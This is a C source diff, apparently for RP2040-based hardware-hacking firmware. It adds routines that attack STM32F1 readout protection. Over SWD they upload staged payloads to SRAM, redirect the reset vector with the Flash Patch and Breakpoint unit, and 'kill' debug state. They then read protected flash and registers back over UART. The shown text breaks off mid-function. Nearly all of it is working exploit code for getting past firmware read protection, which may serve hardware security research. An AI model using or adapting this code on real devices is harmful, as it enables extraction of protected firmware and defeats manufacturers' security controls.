@@ -150,6 +150,9 @@ static const uint8_t f103_rdp_bypass_payload[] = {
 // Protocol: "RDP1" + CPUID(4B) + "DIAG" + 7 regs(28B) + flash bytes
 // Regs: DHCSR, DEMCR, FP_CTRL, FP_COMP0, VTOR, FLASH_OBR, RCC_CSR
 #include "../stm32_payloads/f1/rdp_bypass_diag_hex.h"
+#include "../stm32_payloads/f1/rdp_literal_hex.h"
+#include "../stm32_payloads/f1/rdp_regdump_hex.h"
+#include "../stm32_payloads/f1/rdp_resettest_hex.h"
 
 // RDP bypass constants
 #define BYPASS_DUMP_ADDR   0x20004000  // Where stage2 dumps flash
@@ -2354,4 +2357,1306 @@ halt_reset:
 halt_cleanup:
     gpio_put(BOOT0_PIN, 0);
     gpio_put(BOOT1_PIN, 0);
+}
+
+void target_power_literal(void) {
+    extern bool swd_connect_under_reset(void);
+    extern bool swd_halt(void);
+    extern bool swd_resume(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info)
+        return;
+
+    uint32_t sram_base = info->sram_base;
+    uint32_t payload_words = (sizeof(rdp_literal_payload) + 3) / 4;
+    const uint32_t stage2_thumb_addr = sram_base + 0x3B4 + 1;
+
+    uart_cli_printf("RDP1 LITERAL test: %u byte payload -> 0x%08lX\r\n",
+                    (unsigned)sizeof(rdp_literal_payload), sram_base);
+    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);
+
+    // === Step 1: Connect under reset ===
+    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
+    swd_init();
+
+    gpio_init(BOOT0_PIN);
+    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+    gpio_put(BOOT0_PIN, 0);
+    gpio_init(BOOT1_PIN);
+    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
+    gpio_put(BOOT1_PIN, 0);
+
+    if (!swd_connect_under_reset()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
+        return;
+    }
+    uart_cli_send("    Connected, core halted under reset\r\n");
+
+    // === Step 2: Upload literal payload to SRAM ===
+    uart_cli_send("[2] Uploading literal payload to SRAM...\r\n");
+    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_literal_payload, payload_words);
+    if (written != payload_words) {
+        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
+        swd_deinit();
+        return;
+    }
+
+    uint32_t readback[payload_words];
+    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
+    if (nread != payload_words || memcmp(readback, rdp_literal_payload, sizeof(rdp_literal_payload)) != 0) {
+        uart_cli_send("ERROR: SRAM verify failed\r\n");
+        swd_deinit();
+        return;
+    }
+    uart_cli_send("    Payload uploaded and verified\r\n");
+
+    // === Step 3: Configure FPB via SWD ===
+    uart_cli_send("[3] Configuring FPB via SWD...\r\n");
+
+    // Write stage 2 thumb address to remap[0]
+    uint32_t remap_val = stage2_thumb_addr;
+    if (swd_write_mem(sram_base + 0x20, &remap_val, 1) != 1) {
+        uart_cli_send("ERROR: Failed to write remap table\r\n");
+        swd_deinit();
+        return;
+    }
+
+    // FP_CTRL = ENABLE + KEY
+    uint32_t fp_ctrl = 0x03;
+    swd_write_mem(0xE0002000, &fp_ctrl, 1);
+
+    // FP_REMAP = 0x20000020
+    uint32_t fp_remap = 0x20000020;
+    swd_write_mem(0xE0002004, &fp_remap, 1);
+
+    // FP_COMP0: reset vector redirect (addr 0x04, REPLACE=00, ENABLE)
+    uint32_t fp_comp0 = 0x05;
+    swd_write_mem(0xE0002008, &fp_comp0, 1);
+
+    // Verify FPB config
+    uint32_t verify_val;
+    swd_read_mem(0xE0002000, &verify_val, 1);
+    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
+    swd_read_mem(0xE0002004, &verify_val, 1);
+    uart_cli_printf("    FP_REMAP: 0x%08lX\r\n", verify_val);
+    swd_read_mem(0xE0002008, &verify_val, 1);
+    uart_cli_printf("    FP_COMP0: 0x%08lX\r\n", verify_val);
+    swd_read_mem(sram_base + 0x20, &verify_val, 1);
+    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);
+
+    // Clear VC_CORERESET
+    uint32_t demcr_val = 0;
+    swd_write_mem(0xE000EDFC, &demcr_val, 1);
+
+    // === Step 4: Set PC to stage 1, 3-step detach ===
+    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
+    uint32_t stage1_addr = sram_base + 0x200 + 1;
+    swd_write_core_reg(13, 0x20005000);
+    swd_write_core_reg(15, stage1_addr);
+
+    // Init UART before resume
+    uart_deinit(TARGET_UART_ID);
+    gpio_deinit(TARGET_UART_RX_PIN);
+    gpio_init(TARGET_UART_RX_PIN);
+    uart_init(TARGET_UART_ID, 115200);
+    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
+    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
+
+    // BMP cortexm_detach: 3-step DHCSR
+    uint32_t dhcsr_val;
+    dhcsr_val = 0xA05F0003;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    dhcsr_val = 0xA05F0001;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    dhcsr_val = 0xA05F0000;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    swd_deinit();
+
+    sleep_ms(200);
+
+    // Read stage 1 report
+    uart_cli_send("    Stage 1 report: ");
+    int s1_chars = 0;
+    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
+        uint8_t c = uart_getc(TARGET_UART_ID);
+        uart_cli_printf("%02X ", c);
+        s1_chars++;
+    }
+    if (s1_chars == 0) uart_cli_send("(nothing received)");
+    uart_cli_send("\r\n");
+
+    // === Step 5: Pulse nRST — FPB redirects to stage 2 ===
+    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");
+
+    while (uart_is_readable(TARGET_UART_ID))
+        uart_getc(TARGET_UART_ID);
+
+    uint8_t reset_pin = 15;
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_OUT);
+    gpio_put(reset_pin, 0);
+    sleep_ms(10);
+    gpio_put(reset_pin, 1);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    // === Step 6: Receive literal test results ===
+    uart_cli_send("[6] Receiving literal comparator test results...\r\n");
+
+    #define LIT_TIMEOUT_US 5000000
+    #define LIT_BYTE_TIMEOUT_US 500000
+
+    // Scan for "LIT1" header
+    uint8_t hdr_state = 0;
+    const char *hdr_str = "LIT1";
+    uint64_t rx_start = time_us_64();
+    bool hdr_found = false;
+
+    while (!hdr_found) {
+        if (uart_is_readable(TARGET_UART_ID)) {
+            uint8_t c = uart_getc(TARGET_UART_ID);
+            if (c == hdr_str[hdr_state]) {
+                hdr_state++;
+                if (hdr_state == 4) hdr_found = true;
+            } else {
+                hdr_state = (c == 'L') ? 1 : 0;
+            }
+        } else {
+            if (time_us_64() - rx_start > LIT_TIMEOUT_US) break;
+        }
+    }
+
+    if (!hdr_found) {
+        uart_cli_send("ERROR: \"LIT1\" header not received\r\n");
+        goto lit_cleanup;
+    }
+    uart_cli_send("    Header: LIT1\r\n");
+
+    // Helper: read 4 bytes LE into uint32_t
+    #define READ_WORD(dest) do { \
+        uint8_t _b[4]; bool _ok = true; \
+        for (int _i = 0; _i < 4; _i++) { \
+            uint64_t _t = time_us_64(); \
+            while (!uart_is_readable(TARGET_UART_ID)) { \
+                if (time_us_64() - _t > LIT_BYTE_TIMEOUT_US) { _ok = false; break; } \
+            } \
+            if (!_ok) break; \
+            _b[_i] = uart_getc(TARGET_UART_ID); \
+        } \
+        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); goto lit_cleanup; } \
+        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
+    } while(0)
+
+    uint32_t val;
+
+    // DHCSR
+    READ_WORD(val);
+    uart_cli_printf("    DHCSR:    0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);
+
+    // FP_CTRL
+    READ_WORD(val);
+    uart_cli_printf("    FP_CTRL:  0x%08lX  ENABLE=%lu NUM_CODE=%lu NUM_LIT=%lu\r\n",
+                    val, val & 1, (val >> 4) & 0xF, (val >> 8) & 0xF);
+
+    // FP_COMP6
+    READ_WORD(val);
+    uart_cli_printf("    FP_COMP6: 0x%08lX  ENABLE=%lu\r\n", val, val & 1);
+
+    // FP_COMP7
+    READ_WORD(val);
+    uart_cli_printf("    FP_COMP7: 0x%08lX  ENABLE=%lu\r\n", val, val & 1);
+
+    // Test read 0: 0x08000000 (COMP6 should intercept)
+    READ_WORD(val);
+    uart_cli_printf("    Read 0x08000000: 0x%08lX", val);
+    if (val == 0xDEAD0006)
+        uart_cli_send("  << SENTINEL (literal comp intercepted!)\r\n");
+    else
+        uart_cli_printf("  << %s\r\n", val == 0 ? "ZERO" : "UNKNOWN");
+
+    // Test read 1: 0x08000004 (COMP7 should intercept)
+    READ_WORD(val);
+    uart_cli_printf("    Read 0x08000004: 0x%08lX", val);
+    if (val == 0xDEAD0007)
+        uart_cli_send("  << SENTINEL (literal comp intercepted!)\r\n");
+    else
+        uart_cli_printf("  << %s\r\n", val == 0 ? "ZERO" : "UNKNOWN");
+
+    // Test read 2: 0x08000008 (no comp — should fault)
+    READ_WORD(val);
+    uart_cli_printf("    Read 0x08000008: 0x%08lX\r\n", val);
+
+    // Check for "DONE" or "FLT!"
+    {
+        char trail[4] = {0};
+        bool got_trail = true;
+        for (int i = 0; i < 4; i++) {
+            uint64_t t0 = time_us_64();
+            while (!uart_is_readable(TARGET_UART_ID)) {
+                if (time_us_64() - t0 > LIT_BYTE_TIMEOUT_US) { got_trail = false; break; }
+            }
+            if (!got_trail) break;
+            trail[i] = uart_getc(TARGET_UART_ID);
+        }
+        if (got_trail) {
+            if (memcmp(trail, "DONE", 4) == 0)
+                uart_cli_send("\r\n    Result: ALL READS SUCCEEDED (DONE)\r\n");
+            else if (memcmp(trail, "FLT!", 4) == 0) {
+                uart_cli_send("\r\n    Result: HARDFAULT (FLT!)\r\n");
+                // Read stacked PC (4 bytes)
+                uint32_t fault_pc;
+                READ_WORD(fault_pc);
+                uart_cli_printf("    Fault PC: 0x%08lX\r\n", fault_pc);
+            } else {
+                uart_cli_printf("\r\n    Trailing: %02X %02X %02X %02X\r\n",
+                               trail[0], trail[1], trail[2], trail[3]);
+            }
+        } else {
+            uart_cli_send("\r\n    (no trailing marker received)\r\n");
+        }
+    }
+
+    #undef READ_WORD
+
+    uart_cli_send("[7] Power cycling target...\r\n");
+    gpio_clr_mask(POWER_MASK);
+    sleep_ms(100);
+    gpio_set_mask(POWER_MASK);
+
+lit_cleanup:
+    gpio_put(BOOT0_PIN, 0);
+    gpio_put(BOOT1_PIN, 0);
+}
+
+void target_power_regdump(void) {
+    extern bool swd_connect_under_reset(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info)
+        return;
+
+    uint32_t sram_base = info->sram_base;
+    uint32_t payload_words = (sizeof(rdp_regdump_payload) + 3) / 4;
+    const uint32_t stage2_thumb_addr = sram_base + 0x3D4 + 1;
+
+    uart_cli_printf("RDP1 REGDUMP: %u byte payload -> 0x%08lX\r\n",
+                    (unsigned)sizeof(rdp_regdump_payload), sram_base);
+    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);
+
+    // === Step 1: Connect under reset ===
+    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
+    swd_init();
+
+    gpio_init(BOOT0_PIN);
+    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+    gpio_put(BOOT0_PIN, 0);
+    gpio_init(BOOT1_PIN);
+    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
+    gpio_put(BOOT1_PIN, 0);
+
+    if (!swd_connect_under_reset()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
+        return;
+    }
+    uart_cli_send("    Connected, core halted under reset\r\n");
+
+    // === Step 2: Upload payload ===
+    uart_cli_send("[2] Uploading regdump payload to SRAM...\r\n");
+    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_regdump_payload, payload_words);
+    if (written != payload_words) {
+        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
+        swd_deinit();
+        return;
+    }
+
+    uint32_t readback[payload_words];
+    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
+    if (nread != payload_words || memcmp(readback, rdp_regdump_payload, sizeof(rdp_regdump_payload)) != 0) {
+        uart_cli_send("ERROR: SRAM verify failed\r\n");
+        swd_deinit();
+        return;
+    }
+    uart_cli_send("    Payload uploaded and verified\r\n");
+
+    // === Step 3: Configure FPB ===
+    uart_cli_send("[3] Configuring FPB via SWD...\r\n");
+
+    uint32_t remap_val = stage2_thumb_addr;
+    swd_write_mem(sram_base + 0x20, &remap_val, 1);
+
+    uint32_t fp_ctrl = 0x03;
+    swd_write_mem(0xE0002000, &fp_ctrl, 1);
+    uint32_t fp_remap = 0x20000020;
+    swd_write_mem(0xE0002004, &fp_remap, 1);
+    uint32_t fp_comp0 = 0x05;
+    swd_write_mem(0xE0002008, &fp_comp0, 1);
+
+    uint32_t verify_val;
+    swd_read_mem(0xE0002000, &verify_val, 1);
+    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
+    swd_read_mem(sram_base + 0x20, &verify_val, 1);
+    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);
+
+    uint32_t demcr_val = 0;
+    swd_write_mem(0xE000EDFC, &demcr_val, 1);
+
+    // === Step 4: Set PC to stage 1, 3-step detach ===
+    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
+    uint32_t stage1_addr = sram_base + 0x200 + 1;
+    swd_write_core_reg(13, 0x20005000);
+    swd_write_core_reg(15, stage1_addr);
+
+    uart_deinit(TARGET_UART_ID);
+    gpio_deinit(TARGET_UART_RX_PIN);
+    gpio_init(TARGET_UART_RX_PIN);
+    uart_init(TARGET_UART_ID, 115200);
+    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
+    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
+
+    uint32_t dhcsr_val;
+    dhcsr_val = 0xA05F0003;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    dhcsr_val = 0xA05F0001;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    dhcsr_val = 0xA05F0000;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+
+    // DP power-down — kill debug+system domains, hold down before nRST
+    // Don't read back (that would re-power it via SWD handshake)
+    extern bool swd_write_dp(uint8_t addr, uint32_t value);
+    extern bool swd_read_dp(uint8_t addr, uint32_t *value);
+    uint32_t dp_ctrl;
+    if (swd_read_dp(0x4, &dp_ctrl)) {
+        uart_cli_printf("    DP CTRL/STAT: 0x%08lX\r\n", dp_ctrl);
+        uint32_t dp_off = dp_ctrl & ~((1u << 28) | (1u << 30));
+        swd_write_dp(0x4, dp_off);
+        uart_cli_send("    Debug domains powered down, holding 2s...\r\n");
+    }
+
+    swd_deinit();
+
+    sleep_ms(2000);
+
+    uart_cli_send("    Stage 1 report: ");
+    int s1_chars = 0;
+    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
+        uint8_t c = uart_getc(TARGET_UART_ID);
+        uart_cli_printf("%02X ", c);
+        s1_chars++;
+    }
+    if (s1_chars == 0) uart_cli_send("(nothing received)");
+    uart_cli_send("\r\n");
+
+    // === Step 5: Pulse nRST (flash boot with FPB redirect) ===
+    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");
+
+    while (uart_is_readable(TARGET_UART_ID))
+        uart_getc(TARGET_UART_ID);
+
+    uint8_t reset_pin = 15;
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_OUT);
+    gpio_put(reset_pin, 0);
+    sleep_ms(10);
+    gpio_put(reset_pin, 1);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    // === Step 6: Receive register dump ===
+    uart_cli_send("[6] Receiving register dump...\r\n");
+
+    #define RD_TIMEOUT_US 5000000
+    #define RD_BYTE_TIMEOUT_US 500000
+
+    // Scan for "REG1" header
+    uint8_t hdr_state = 0;
+    const char *hdr_str = "REG1";
+    uint64_t rx_start = time_us_64();
+    bool hdr_found = false;
+
+    while (!hdr_found) {
+        if (uart_is_readable(TARGET_UART_ID)) {
+            uint8_t c = uart_getc(TARGET_UART_ID);
+            if (c == hdr_str[hdr_state]) {
+                hdr_state++;
+                if (hdr_state == 4) hdr_found = true;
+            } else {
+                hdr_state = (c == 'R') ? 1 : 0;
+            }
+        } else {
+            if (time_us_64() - rx_start > RD_TIMEOUT_US) break;
+        }
+    }
+
+    if (!hdr_found) {
+        uart_cli_send("ERROR: \"REG1\" header not received\r\n");
+        goto rd_cleanup;
+    }
+    uart_cli_send("    Header: REG1\r\n");
+
+    // Read 4 bytes LE into uint32_t
+    #define RD_READ_WORD(dest) do { \
+        uint8_t _b[4]; bool _ok = true; \
+        for (int _i = 0; _i < 4; _i++) { \
+            uint64_t _t = time_us_64(); \
+            while (!uart_is_readable(TARGET_UART_ID)) { \
+                if (time_us_64() - _t > RD_BYTE_TIMEOUT_US) { _ok = false; break; } \
+            } \
+            if (!_ok) break; \
+            _b[_i] = uart_getc(TARGET_UART_ID); \
+        } \
+        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); goto rd_cleanup; } \
+        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
+    } while(0)
+
+    uint32_t val;
+
+    uart_cli_send("\r\n=== REGISTER DUMP ===\r\n");
+
+    // 0: DHCSR
+    RD_READ_WORD(val);
+    uart_cli_printf("  DHCSR        (0xE000EDF0) = 0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);
+
+    // 1: DEMCR
+    RD_READ_WORD(val);
+    uart_cli_printf("  DEMCR        (0xE000EDFC) = 0x%08lX  VC_CORERESET=%lu TRCENA=%lu\r\n",
+                    val, val & 1, (val >> 24) & 1);
+
+    // 2: DBGMCU_IDCODE
+    RD_READ_WORD(val);
+    uart_cli_printf("  DBGMCU_IDCODE(0xE0042000) = 0x%08lX  DEV_ID=0x%03lX REV=0x%04lX\r\n",
+                    val, val & 0xFFF, (val >> 16) & 0xFFFF);
+
+    // 3: DBGMCU_CR
+    RD_READ_WORD(val);
+    uart_cli_printf("  DBGMCU_CR    (0xE0042004) = 0x%08lX", val);
+    if (val & 1) uart_cli_send(" DBG_SLEEP");
+    if (val & 2) uart_cli_send(" DBG_STOP");
+    if (val & 4) uart_cli_send(" DBG_STANDBY");
+    uart_cli_send("\r\n");
+
+    // 4: FLASH_ACR
+    RD_READ_WORD(val);
+    uart_cli_printf("  FLASH_ACR    (0x40022000) = 0x%08lX  LATENCY=%lu PRFTBE=%lu PRFTBS=%lu\r\n",
+                    val, val & 7, (val >> 4) & 1, (val >> 5) & 1);
+
+    // 5: FLASH_SR
+    RD_READ_WORD(val);
+    uart_cli_printf("  FLASH_SR     (0x4002200C) = 0x%08lX  BSY=%lu PGERR=%lu WRPRTERR=%lu EOP=%lu\r\n",
+                    val, val & 1, (val >> 2) & 1, (val >> 4) & 1, (val >> 5) & 1);
+
+    // 6: FLASH_CR
+    RD_READ_WORD(val);
+    uart_cli_printf("  FLASH_CR     (0x40022010) = 0x%08lX  LOCK=%lu", val, (val >> 7) & 1);
+    if (val & 1) uart_cli_send(" PG");
+    if (val & 2) uart_cli_send(" PER");
+    if (val & 4) uart_cli_send(" MER");
+    if (val & 0x10) uart_cli_send(" OPTPG");
+    if (val & 0x20) uart_cli_send(" OPTER");
+    uart_cli_send("\r\n");
+
+    // 7: FLASH_OBR — THE KEY ONE
+    RD_READ_WORD(val);
+    uart_cli_printf("  FLASH_OBR    (0x4002201C) = 0x%08lX  *** RDPRT=%lu ***", val, (val >> 1) & 1);
+    if (val & 1) uart_cli_send(" OPTERR");
+    uart_cli_printf("  Data0=0x%02lX Data1=0x%02lX\r\n", (val >> 10) & 0xFF, (val >> 18) & 0xFF);
+
+    // 8: FLASH_WRPR
+    RD_READ_WORD(val);
+    uart_cli_printf("  FLASH_WRPR   (0x40022020) = 0x%08lX\r\n", val);
+
+    // 9: FP_CTRL
+    RD_READ_WORD(val);
+    uart_cli_printf("  FP_CTRL      (0xE0002000) = 0x%08lX  ENABLE=%lu\r\n", val, val & 1);
+
+    // 10: DWT_CTRL
+    RD_READ_WORD(val);
+    uart_cli_printf("  DWT_CTRL     (0xE0001000) = 0x%08lX\r\n", val);
+
+    // 11: SCB_AIRCR
+    RD_READ_WORD(val);
+    uart_cli_printf("  SCB_AIRCR    (0xE000ED0C) = 0x%08lX  VECTKEY=0x%03lX\r\n",
+                    val, (val >> 16) & 0xFFFF);
+
+    // 12: SCB_SCR
+    RD_READ_WORD(val);
+    uart_cli_printf("  SCB_SCR      (0xE000ED10) = 0x%08lX\r\n", val);
+
+    // 13: AFIO_MAPR
+    RD_READ_WORD(val);
+    uart_cli_printf("  AFIO_MAPR    (0x40010004) = 0x%08lX  SWJ_CFG=%lu\r\n",
+                    val, (val >> 24) & 7);
+
+    // 14: RCC_CR
+    RD_READ_WORD(val);
+    uart_cli_printf("  RCC_CR       (0x40021000) = 0x%08lX  HSION=%lu HSIRDY=%lu HSEON=%lu HSERDY=%lu PLLON=%lu\r\n",
+                    val, val & 1, (val >> 1) & 1, (val >> 16) & 1, (val >> 17) & 1, (val >> 24) & 1);
+
+    // 15: RCC_CSR
+    RD_READ_WORD(val);
+    uart_cli_printf("  RCC_CSR      (0x40021024) = 0x%08lX ", val);
+    if (val & (1 << 26)) uart_cli_send("PIN_RST ");
+    if (val & (1 << 27)) uart_cli_send("POR ");
+    if (val & (1 << 28)) uart_cli_send("SW_RST ");
+    if (val & (1 << 29)) uart_cli_send("IWDG ");
+    if (val & (1 << 30)) uart_cli_send("WWDG ");
+    if (val & (1 << 31)) uart_cli_send("LPWR ");
+    uart_cli_send("\r\n");
+
+    // 16: CPUID
+    RD_READ_WORD(val);
+    uart_cli_printf("  CPUID        (0xE000ED00) = 0x%08lX", val);
+    uint8_t impl = (val >> 24) & 0xFF;
+    uint16_t partno = (val >> 4) & 0xFFF;
+    if (impl == 0x41 && partno == 0xC23)
+        uart_cli_printf("  Cortex-M3 r%lup%lu", (val >> 20) & 0xF, val & 0xF);
+    uart_cli_send("\r\n");
+
+    uart_cli_send("=====================\r\n");
+
+    // === Flash read tests ===
+    uart_cli_send("\r\n=== FLASH READ TESTS ===\r\n");
+    struct {
+        const char *name;
+        uint32_t addr;
+    } flash_tests[] = {
+        {"Flash base     ", 0x08000000},
+        {"Reset vector   ", 0x08000004},
+        {"Option bytes   ", 0x1FFFF800},
+        {"OB USER/nUSER  ", 0x1FFFF802},
+        {"Flash size reg ", 0x1FFFF7E0},
+    };
+
+    for (int t = 0; t < 5; t++) {
+        uint64_t t0 = time_us_64();
+        while (!uart_is_readable(TARGET_UART_ID)) {
+            if (time_us_64() - t0 > RD_BYTE_TIMEOUT_US) {
+                uart_cli_printf("  %s (0x%08lX): TIMEOUT\r\n", flash_tests[t].name, flash_tests[t].addr);
+                goto rd_done;
+            }
+        }
+        uint8_t status = uart_getc(TARGET_UART_ID);
+        uint32_t data;
+        RD_READ_WORD(data);
+
+        if (status == 'O') {
+            uart_cli_printf("  %s (0x%08lX): OK    0x%08lX\r\n",
+                           flash_tests[t].name, flash_tests[t].addr, data);
+        } else if (status == 'F') {
+            uart_cli_printf("  %s (0x%08lX): FAULT (PC=0x%08lX)\r\n",
+                           flash_tests[t].name, flash_tests[t].addr, data);
+        } else {
+            uart_cli_printf("  %s (0x%08lX): ??? status=0x%02X data=0x%08lX\r\n",
+                           flash_tests[t].name, flash_tests[t].addr, status, data);
+        }
+    }
+
+rd_done:
+    // Check for "DONE"
+    {
+        char done_buf[4] = {0};
+        bool got_done = true;
+        for (int i = 0; i < 4; i++) {
+            uint64_t t0 = time_us_64();
+            while (!uart_is_readable(TARGET_UART_ID)) {
+                if (time_us_64() - t0 > RD_BYTE_TIMEOUT_US) { got_done = false; break; }
+            }
+            if (!got_done) break;
+            done_buf[i] = uart_getc(TARGET_UART_ID);
+        }
+        if (got_done && memcmp(done_buf, "DONE", 4) == 0)
+            uart_cli_send("\r\n=== COMPLETE ===\r\n");
+        else
+            uart_cli_send("\r\n=== INCOMPLETE ===\r\n");
+    }
+
+    #undef RD_READ_WORD
+
+    uart_cli_send("[7] Power cycling target...\r\n");
+    gpio_clr_mask(POWER_MASK);
+    sleep_ms(100);
+    gpio_set_mask(POWER_MASK);
+
+rd_cleanup:
+    gpio_put(BOOT0_PIN, 0);
+    gpio_put(BOOT1_PIN, 0);
+}
+
+// Receive and display regdump results from UART (shared by halt and glitch variants)
+static bool receive_regdump_results(void) {
+    #define RDR_TIMEOUT_US 5000000
+    #define RDR_BYTE_TIMEOUT_US 500000
+
+    // Scan for "REG1" header
+    uint8_t hdr_state = 0;
+    const char *hdr_str = "REG1";
+    uint64_t rx_start = time_us_64();
+    bool hdr_found = false;
+
+    while (!hdr_found) {
+        if (uart_is_readable(TARGET_UART_ID)) {
+            uint8_t c = uart_getc(TARGET_UART_ID);
+            if (c == hdr_str[hdr_state]) {
+                hdr_state++;
+                if (hdr_state == 4) hdr_found = true;
+            } else {
+                hdr_state = (c == 'R') ? 1 : 0;
+            }
+        } else {
+            if (time_us_64() - rx_start > RDR_TIMEOUT_US) break;
+        }
+    }
+
+    if (!hdr_found) {
+        uart_cli_send("ERROR: \"REG1\" header not received\r\n");
+        return false;
+    }
+    uart_cli_send("    Header: REG1\r\n");
+
+    // Read 4 bytes LE into uint32_t
+    #define RDR_READ_WORD(dest) do { \
+        uint8_t _b[4]; bool _ok = true; \
+        for (int _i = 0; _i < 4; _i++) { \
+            uint64_t _t = time_us_64(); \
+            while (!uart_is_readable(TARGET_UART_ID)) { \
+                if (time_us_64() - _t > RDR_BYTE_TIMEOUT_US) { _ok = false; break; } \
+            } \
+            if (!_ok) break; \
+            _b[_i] = uart_getc(TARGET_UART_ID); \
+        } \
+        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); return false; } \
+        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
+    } while(0)
+
+    uint32_t val;
+
+    uart_cli_send("\r\n=== REGISTER DUMP ===\r\n");
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  DHCSR        (0xE000EDF0) = 0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  DEMCR        (0xE000EDFC) = 0x%08lX  VC_CORERESET=%lu TRCENA=%lu\r\n",
+                    val, val & 1, (val >> 24) & 1);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  DBGMCU_IDCODE(0xE0042000) = 0x%08lX  DEV_ID=0x%03lX REV=0x%04lX\r\n",
+                    val, val & 0xFFF, (val >> 16) & 0xFFFF);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  DBGMCU_CR    (0xE0042004) = 0x%08lX", val);
+    if (val & 1) uart_cli_send(" DBG_SLEEP");
+    if (val & 2) uart_cli_send(" DBG_STOP");
+    if (val & 4) uart_cli_send(" DBG_STANDBY");
+    uart_cli_send("\r\n");
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  FLASH_ACR    (0x40022000) = 0x%08lX  LATENCY=%lu PRFTBE=%lu PRFTBS=%lu\r\n",
+                    val, val & 7, (val >> 4) & 1, (val >> 5) & 1);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  FLASH_SR     (0x4002200C) = 0x%08lX  BSY=%lu PGERR=%lu WRPRTERR=%lu EOP=%lu\r\n",
+                    val, val & 1, (val >> 2) & 1, (val >> 4) & 1, (val >> 5) & 1);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  FLASH_CR     (0x40022010) = 0x%08lX  LOCK=%lu", val, (val >> 7) & 1);
+    if (val & 1) uart_cli_send(" PG");
+    if (val & 2) uart_cli_send(" PER");
+    if (val & 4) uart_cli_send(" MER");
+    if (val & 0x10) uart_cli_send(" OPTPG");
+    if (val & 0x20) uart_cli_send(" OPTER");
+    uart_cli_send("\r\n");
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  FLASH_OBR    (0x4002201C) = 0x%08lX  *** RDPRT=%lu ***", val, (val >> 1) & 1);
+    if (val & 1) uart_cli_send(" OPTERR");
+    uart_cli_printf("  Data0=0x%02lX Data1=0x%02lX\r\n", (val >> 10) & 0xFF, (val >> 18) & 0xFF);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  FLASH_WRPR   (0x40022020) = 0x%08lX\r\n", val);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  FP_CTRL      (0xE0002000) = 0x%08lX  ENABLE=%lu\r\n", val, val & 1);
+
+    RDR_READ_WORD(val);
